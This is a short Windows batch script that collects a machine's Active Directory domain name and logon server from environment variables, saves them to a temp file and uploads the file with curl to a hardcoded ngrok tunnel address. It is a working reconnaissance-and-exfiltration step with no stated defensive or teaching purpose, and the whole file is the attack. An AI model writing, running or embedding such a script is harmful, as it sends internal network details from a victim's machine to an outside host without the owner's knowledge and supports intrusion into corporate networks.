@echo off
REM Ultra-simple version - just echo and upload

REM ===== EDIT THIS =====
set SERVER=https://f5ac-102-117-174-69.ngrok-free.app/upload
REM ====================

echo Domain: %USERDNSDOMAIN%
echo Logon Server: %LOGONSERVER%

REM Create simple output
echo Domain: %USERDNSDOMAIN% > %TEMP%\ad.txt
echo Logon Server: %LOGONSERVER% >> %TEMP%\ad.txt

REM Upload
curl -X POST -F "file=@%TEMP%\ad.txt" %SERVER%

pause
